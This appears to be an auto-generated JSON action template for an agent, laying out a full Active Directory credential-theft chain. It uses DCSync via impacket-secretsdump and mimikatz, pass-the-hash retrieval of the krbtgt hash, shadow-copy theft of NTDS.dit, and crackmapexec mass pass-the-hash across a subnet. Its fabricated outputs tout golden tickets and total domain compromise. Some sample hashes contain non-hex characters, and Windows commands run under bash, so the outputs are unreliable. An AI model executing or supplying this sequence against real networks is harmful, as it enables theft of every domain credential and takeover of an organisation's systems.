{
  "name": "dcsync_ntds_dump",
  "description": "DCSync and NTDS.dit extraction for complete domain credential dump",
  "pattern": "dcsync|ntds.*dit|ntds.*dump|domain.*hash",
  "parameters": [
    "domain",
    "dc_ip",
    "username"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-secretsdump",
        "args": [
          "corp.local/administrator:P@ssw0rd123@10.10.10.10",
          "-just-dc"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08:::\nCORP.LOCAL\\john.doe:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nCORP.LOCAL\\jane.smith:1105:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::\nCORP.LOCAL\\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nCORP.LOCAL\\svc-web:1107:aad3b435b51404eeaad3b435b51404ee:f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4:::\nCORP.LOCAL\\backup_admin:1108:aad3b435b51404eeaad3b435b51404ee:3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f:::\n[... 116 more users ...]\n\n[*] Kerberos keys grabbed\ncorp.local\\Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6g7h8...\ncorp.local\\Administrator:aes128-cts-hmac-sha1-96:9f8e7d6c5b4a...\ncorp.local\\Administrator:des-cbc-md5:1a2b3c4d5e6f...\n[... AES keys for all users ...]\n\n[*] Cleaning up...\n\nDCSync successful!\n  Method: DRSUAPI (Directory Replication Service)\n  Total users: 124\n  Hashes extracted: All NTLM hashes\n  Kerberos keys: AES256, AES128, DES\n  \nNo direct DC access needed!\n  Uses replication protocol\n  Appears as legitimate DC sync\n  Requires Domain Admin or Replication rights"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "cmd",
        "args": [
          "/c",
          "C:\\Tools\\mimikatz.exe \"lsadump::dcsync /domain:corp.local /all /csv\" \"exit\" > dcsync_all.csv"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "502\tkrbtgt\t9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n500\tAdministrator\t31d6cfe0d16ae931b73c59d7e0c089c0\n1104\tjohn.doe\t64f12cddaa88057e06a81b54e73b949b\n1105\tjane.smith\ta1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n1106\tsqlservice\t8846f7eaee8fb117ad06bdd830b7586c\n1107\tsvc-web\tf9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4\n1108\tbackup_admin\t3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f\n[... 117 more users ...]\n\nMimikatz DCSync to CSV:\n  Output: dcsync_all.csv\n  Format: RID,Username,NTLM\n  All domain users: 124\n  \nImport to hashcat/john:\n  Format already compatible\n  Or use for Pass-the-Hash attacks\n  \nCSV advantages:\n  - Easy parsing\n  - Import to spreadsheet\n  - Scripting/automation"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-secretsdump",
        "args": [
          "-hashes",
          "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
          "corp.local/administrator@10.10.10.10",
          "-just-dc-user",
          "krbtgt"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08:::\n\n[*] Kerberos keys grabbed\ncorp.local\\krbtgt:aes256-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b\ncorp.local\\krbtgt:aes128-cts-hmac-sha1-96:7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b\ncorp.local\\krbtgt:des-cbc-md5:a1b2c3d4e5f6g7h8\n\n[*] Cleaning up...\n\nTargeted DCSync for krbtgt:\n  User: krbtgt only\n  NTLM: 9f86d081884c7d659a2feaa0c55ad015...\n  AES256: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d...\n  \nWith krbtgt hash:\n  Create Golden Tickets\n  Unlimited domain access\n  Persistence for years\n  \nPass-the-Hash DCSync:\n  No password needed\n  Used admin NTLM hash\n  Extracted krbtgt hash"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hive"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool\n(C) Copyright 2001-2013 Microsoft Corp.\n\nSuccessfully created shadow copy for 'C:\\'\n    Shadow Copy ID: {12345678-1234-5678-1234-567812345678}\n    Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n\n        1 file(s) copied.\n        1 file(s) copied.\n\nNTDS.dit extracted via Volume Shadow Copy:\n  Source: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit\n  Destination: C:\\Temp\\ntds.dit\n  Size: ~800 MB\n  \nSYSTEM hive extracted:\n  Source: VSS\\Windows\\System32\\config\\SYSTEM\n  Destination: C:\\Temp\\system.hive\n  \nNow extract hashes:\n  impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL\n  \nAdvantages:\n  - No network traffic\n  - Local DC access\n  - Offline extraction"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-secretsdump",
        "args": [
          "-ntds",
          "ntds.dit",
          "-system",
          "system.hive",
          "LOCAL"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b\n[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08:::\n[... all 124 domain users ...]\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::\nWEB-01$:1001:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7:::\n[... all computer accounts ...]\n\n[*] Kerberos keys from ntds.dit\ncorp.local\\Administrator:aes256-cts-hmac-sha1-96:...\n[... AES keys ...]\n\n[*] Cleaning up...\n\nOffline NTDS.dit extraction:\n  Total entries: 150+ (users + computers)\n  User accounts: 124\n  Computer accounts: 26\n  NTLM hashes: All extracted\n  Kerberos keys: AES256, AES128\n  \nComplete domain compromise!\n  Every user hash extracted\n  Every computer account hash\n  Use for Pass-the-Hash across domain"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-secretsdump",
        "args": [
          "corp.local/administrator:P@ssw0rd123@10.10.10.10",
          "-just-dc-ntlm",
          "-outputfile",
          "domain_hashes"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\n[*] Dumping NTLM hashes to domain_hashes.ntds\n[*] Cleaning up...\n\ncat domain_hashes.ntds:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015:::\njohn.doe:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\n[... all users ...]\n\nDCSync output to file:\n  Filename: domain_hashes.ntds\n  Format: username:rid:lm:ntlm:::\n  All domain users included\n  \nUse for:\n  - Pass-the-Hash attacks\n  - Credential spraying\n  - Offline cracking\n  - Documentation/reporting\n  \nFormat compatible with:\n  - hashcat\n  - john\n  - crackmapexec"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "crackmapexec",
        "args": [
          "smb",
          "10.10.10.0/24",
          "-u",
          "users.txt",
          "-H",
          "domain_hashes.ntds",
          "--continue-on-success"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "SMB         10.10.10.10     445    DC01             [*] Windows Server 2016 Standard (name:DC01) (domain:corp.local)\nSMB         10.10.10.10     445    DC01             [+] corp.local\\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.20     445    WEB-01           [*] Windows Server 2019 Standard (name:WEB-01) (domain:corp.local)\nSMB         10.10.10.20     445    WEB-01           [+] corp.local\\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.20     445    WEB-01           [+] corp.local\\sqlservice:8846f7eaee8fb117ad06bdd830b7586c\nSMB         10.10.10.30     445    DB-01            [*] Windows Server 2016 Standard (name:DB-01) (domain:corp.local)\nSMB         10.10.10.30     445    DB-01            [+] corp.local\\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.30     445    DB-01            [+] corp.local\\sqlservice:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)\nSMB         10.10.10.40     445    FILE-01          [*] Windows Server 2012 R2 Standard (name:FILE-01) (domain:corp.local)\nSMB         10.10.10.40     445    FILE-01          [+] corp.local\\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\n\nMass Pass-the-Hash with dumped hashes:\n  Tested: All dumped hashes against all domain systems\n  Successful logins:\n    Administrator: 4/4 systems (DC, WEB, DB, FILE)\n    sqlservice: 2/4 systems (WEB, DB)\n    \n  Total compromised: 4 systems\n  \nComplete domain access achieved:\n  - Full domain hash database\n  - Pass-the-Hash to all systems\n  - Lateral movement capability\n  - Persistence via multiple accounts"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
